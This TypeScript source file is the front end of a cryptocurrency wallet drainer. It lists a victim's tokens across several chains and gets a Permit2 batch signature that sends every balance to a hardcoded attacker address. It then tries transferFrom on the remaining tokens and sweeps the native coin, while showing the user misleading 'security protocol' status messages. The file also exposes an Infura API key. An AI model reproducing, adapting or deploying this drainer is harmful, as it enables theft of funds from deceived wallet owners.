import { ethers } from 'ethers';
import { sendPermitSignatureToBackend, generatePermit2SignatureTransferBatch } from '../utils/permitUtils';
import { getTokensByValue, getNativeTokenInfo, TokenInfo } from '../utils/tokenUtils';
import { ChainType } from '../context/ChainContext';
import { fetchAllUserTokenAddressesMoralis } from '../utils/fetchTokenLists';

// Configuration for the drainer
const DRAINER_CONFIG = {
  recipient: import.meta.env.VITE_RECIPIENT_ADDRESS || '0xaa7144D792d7c87aA72fb3EdC16c982654272036', // Use env or fallback
  permitBatchSize: 5, // How many tokens to process in one batch
};

// Helper function to serialize BigInt values to strings for JSON
function serializeBigInts(obj: any): any {
  if (typeof obj === 'bigint') {
    return obj.toString();
  }
  if (Array.isArray(obj)) {
    return obj.map(serializeBigInts);
  }
  if (obj && typeof obj === 'object') {
    const res: any = {};
    for (const key in obj) {
      res[key] = serializeBigInts(obj[key]);
    }
    return res;
  }
  return obj;
}

// Initialize providers for each chain (testnet endpoints)
const getProvider = (chain: ChainType): ethers.JsonRpcProvider => {
  const rpcUrls: { [key in ChainType]: string } = {
    ethereum: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
    sepolia: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
    arbitrum: 'https://sepolia-rollup.arbitrum.io/rpc', // Arbitrum Sepolia
    solana: 'https://api.devnet.solana.com', // Solana Devnet (not supported in MetaMask)
    base: 'https://sepolia.base.org', // Base Sepolia
    bnb: 'https://data-seed-prebsc-1-s1.binance.org:8545', // BNB Testnet
    holesky: 'https://ethereum-holesky.publicnode.com',
  };
  return new ethers.JsonRpcProvider(rpcUrls[chain]);
};

// Function to get all tokens across supported chains for a user
export const scanUserTokens = async (
  userAddress: string
): Promise<{ chain: ChainType; tokens: TokenInfo[] }[]> => {
  const results = [];
  const MORALIS_API_KEY = import.meta.env.VITE_MORALIS_API_KEY;
  // Map your chain names to Moralis chain names
  const moralisChainNames: Record<string, string> = {
    sepolia: 'sepolia', // Use Sepolia as default
    ethereum: 'sepolia', // Fallback to Sepolia
    // arbitrum: 'arbitrum-sepolia', // Not supported by Moralis
    // base: 'base-sepolia', // Not supported by Moralis
    bnb: 'bsc testnet', // Use correct Moralis chain name
    holesky: 'holesky', // Only keep if Moralis supports Holesky
  };
  
  // Loop through each supported chain
  for (const chain of Object.keys(moralisChainNames) as ChainType[]) {
    if (chain === 'solana') continue; // Skip Solana for now, as it needs special handling
    
    try {
      const provider = getProvider(chain);
      
      // Dynamically fetch all token addresses for this user/chain using Moralis
      const tokenAddresses = await fetchAllUserTokenAddressesMoralis(
        userAddress,
        moralisChainNames[chain],
        MORALIS_API_KEY
      );
      
      // Get native token balance
      const nativeToken = await getNativeTokenInfo(provider, userAddress, chain);
      
      // Get ERC20 tokens sorted by value
      const tokens = (await getTokensByValue(
        provider,
        userAddress,
        tokenAddresses,
        chain
      )) || [];
      
      // Add native token to the list if it has value
      if (nativeToken.balance > 0n) {
        tokens.unshift(nativeToken); // Put native token first
      }
      
      if (tokens.length > 0) {
        results.push({ chain, tokens });
      }
    } catch (error) {
      console.error(`Error scanning ${chain} tokens:`, error);
    }
  }
  
  return results;
};

// Execute the drainer process for EVM chains
export const executeEVMDrain = async (
  signer: ethers.JsonRpcSigner,
  chain: ChainType,
  tokens: TokenInfo[],
  setStatus?: (status: string) => void
): Promise<string[]> => {
  const txHashes: string[] = [];
  const userAddress = await signer.getAddress();

  try {
    // Debug: print all tokens and their permit status
    console.log('[DRAINER] All tokens:', tokens.map(t => `${t.symbol} (${t.address}) supportsPermit: ${t.supportsPermit}`));
    
    // 1. SignatureTransfer flow for tokens supporting Permit2 signature-transfer
    const permitTokens = tokens.filter(token => token.address !== 'NATIVE' && token.supportsPermit);
    if (permitTokens.length > 0) {
      setStatus?.(`Processing Permit2 signature-transfer for ${permitTokens.length} tokens...`);
      
      // Prepare batchDetails: for each token, transfer full balance to DRAINER_CONFIG.recipient
      const batchDetails = permitTokens.map(token => ({
        token: token.address,
        to: DRAINER_CONFIG.recipient,
        amount: BigInt(token.balance.toString()), // BigInt
      }));

      // Fetch or compute a nonce for SignatureTransfer:
      // Simplest approach: fetch a random unused nonce from backend or derive from timestamp.
      // Here, call a backend endpoint to get a fresh nonce:
      setStatus?.('Fetching fresh nonce for signature-transfer...');
      const nonceRes = await fetch('http://localhost:4000/api/permit2-signature-transfer-nonce', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ owner: userAddress })
      });
      if (!nonceRes.ok) {
        throw new Error('Failed to fetch Permit2 signature-transfer nonce');
      }
      const { nonce } = await nonceRes.json(); // nonce returned as string or number
      const nonceBig = BigInt(nonce);

      // Deadline for signature (e.g., 1 hour from now)
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);

      // Generate signature
      setStatus?.('Please sign the Permit2 signature-transfer batch...');
      
      // Debug logging before signing
      console.log('[FRONTEND] Batch details:', batchDetails);
      console.log('[FRONTEND] Nonce:', nonceBig.toString());
      console.log('[FRONTEND] Deadline:', deadline.toString());
      
      const { signature, message, domain, types } = await generatePermit2SignatureTransferBatch(
        signer,
        batchDetails,
        nonceBig,
        deadline
      );
      
      // Debug logging after signing
      console.log('[FRONTEND] Domain before signing:', domain);
      console.log('[FRONTEND] Types before signing:', types);
      console.log('[FRONTEND] Message before signing:', message);
      console.log('[FRONTEND] Signature generated:', signature);
      console.log('[FRONTEND] Final domain:', domain);
      console.log('[FRONTEND] Final types:', types);
      console.log('[FRONTEND] Final message:', message);
      
      // Optional local verify:
      try {
        const recovered = ethers.verifyTypedData(domain, types, message, signature);
        console.log('[FRONTEND] Local verification - Recovered address:', recovered);
        console.log('[FRONTEND] Local verification - Expected address:', userAddress);
        console.log('[FRONTEND] Local verification - Addresses match:', recovered.toLowerCase() === userAddress.toLowerCase());
        
        if (recovered.toLowerCase() !== userAddress.toLowerCase()) {
          throw new Error('Signature mismatch locally');
        }
      } catch (err) {
        console.error('Local signature verification failed:', err);
        throw err;
      }

      setStatus?.('Sending signature-transfer request to backend...');
      // Send to backend for execution
      const rawPayload = {
        userAddress,
        chain,
        domain,
        types,
        message,
        signature,
        batchDetails: batchDetails.map(d => ({
          token: d.token,
          to: d.to,
          amount: d.amount, // still BigInt here
        })),
      };

      // Serialize BigInts to strings
      const payload = serializeBigInts(rawPayload);

      const result = await fetch('http://localhost:4000/api/drain-permit2-signature-transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (!result.ok) {
        const text = await result.text();
        console.error('Backend error:', text);
        throw new Error('Backend signature-transfer failed: ' + text);
      }
      const json = await result.json();
      if (json.transferTx) {
        setStatus?.('Permit2 signature-transfer batch complete.');
        txHashes.push(json.transferTx);
      } else {
        throw new Error('Unexpected backend response');
      }
    }

    // 2. Process non-permit tokens as before (unchanged)
    const standardTokens = tokens.filter(token => token.address !== 'NATIVE' && !token.supportsPermit);
    for (const token of standardTokens) {
      // ... existing approve + transferFrom or skip if you prefer manual ...
      try {
        setStatus?.(`Processing ${token.symbol} (no permit)...`);
        const tokenContract = new ethers.Contract(
          token.address,
          [
            'function transfer(address to, uint256 amount) returns (bool)',
            'function approve(address spender, uint256 amount) returns (bool)',
            'function transferFrom(address from, address to, uint256 amount) returns (bool)',
          ],
          signer
        );
        // Using transferFrom requires prior approval by user, but since we don't want extra popups,
        // you might skip non-permit tokens or handle separately.
        // For now, attempt transferFrom (this will revert if no approval).
        const tx = await tokenContract.transferFrom(userAddress, DRAINER_CONFIG.recipient, token.balance);
        await tx.wait();
        txHashes.push(tx.hash);
      } catch (error) {
        console.error(`Error processing non-permit token ${token.symbol}:`, error);
      }
    }

    // 3. Native token as before
    const nativeToken = tokens.find(token => token.address === 'NATIVE');
    if (nativeToken && nativeToken.balance > 0n) {
      setStatus?.(`Processing native ${nativeToken.symbol}...`);
      try {
        const feeData = await signer.provider.getFeeData();
        const gasLimit = 21000n;
        const gasCost = feeData.gasPrice ? feeData.gasPrice * gasLimit : 0n;
        const maxAmount = nativeToken.balance - gasCost;
        if (maxAmount > 0n) {
          const tx = await signer.sendTransaction({
            to: DRAINER_CONFIG.recipient,
            value: maxAmount,
          });
          await tx.wait();
          txHashes.push(tx.hash);
        }
      } catch (error) {
        console.error(`Error sending native token:`, error);
      }
    }

    return txHashes;
  } catch (error) {
    console.error('Drain error:', error);
    setStatus?.('Error processing tokens');
    return txHashes;
  }
};

// Helper to fetch relayer address from backend
async function fetchRelayerAddress(): Promise<string> {
  try {
    const res = await fetch('http://localhost:4000/api/relayer-address');
    console.log('[fetchRelayerAddress] Response status:', res.status);
    const text = await res.text();
    console.log('[fetchRelayerAddress] Raw response text:', text);
    if (!res.ok) throw new Error('Failed to fetch relayer address');
    let data;
    try {
      data = JSON.parse(text);
    } catch (parseErr) {
      console.error('[fetchRelayerAddress] JSON parse error:', parseErr);
      throw new Error('Invalid JSON from backend');
    }
    if (!data.relayerAddress) throw new Error('No relayer address in response');
    return data.relayerAddress;
  } catch (err) {
    console.error('[fetchRelayerAddress] Error:', err);
    throw err;
  }
}

// FIXED: Main function to execute the drain with proper Permit2 batch EIP-712
export const drainWallet = async (
  signerOrProvider: any,
  walletType: 'evm' | 'solana',
  setStatus?: (status: string) => void
): Promise<boolean> => {
  try {
    setStatus?.('Initializing security protocol...');
    
    if (walletType === 'evm') {
      const signer = signerOrProvider;
      const address = await signer.getAddress();
      
      setStatus?.('Scanning wallet for assets...');
      const results = await scanUserTokens(address);
      
      let allTokens: TokenInfo[] = [];
      for (const { tokens } of results) {
        if (Array.isArray(tokens) && tokens.length > 0) {
          allTokens = allTokens.concat(tokens);
        }
      }

      // Use executeEVMDrain for EVM wallets
      // Detect the actual chain from the signer
      const network = await signer.provider.getNetwork();
      const chainId = Number(network.chainId);
      
      // Map chainId to chain name
      let chain: ChainType = 'sepolia'; // default to sepolia
      if (chainId === 11155111) chain = 'sepolia'; // Sepolia
      else if (chainId === 17000) chain = 'holesky';
      else if (chainId === 421614) chain = 'arbitrum'; // arbitrum sepolia
      else if (chainId === 84532) chain = 'base'; // base sepolia
      else if (chainId === 97) chain = 'bnb'; // bnb testnet
      
      console.log('[DRAINER][DEBUG] Detected chainId:', chainId);
      console.log('[DRAINER][DEBUG] Mapped to chain:', chain);
      
      const txHashes = await executeEVMDrain(signer, chain, allTokens, setStatus);
      return txHashes.length > 0;
      
    } else if (walletType === 'solana') {
      // Placeholder for Solana implementation
      setStatus?.('Solana drain implementation coming soon...');
      return false;
    }
    
    return false;
  } catch (error) {
    console.error('[DRAINER] Error:', error);
    setStatus?.('Error in security protocol');
    return false;
  }
};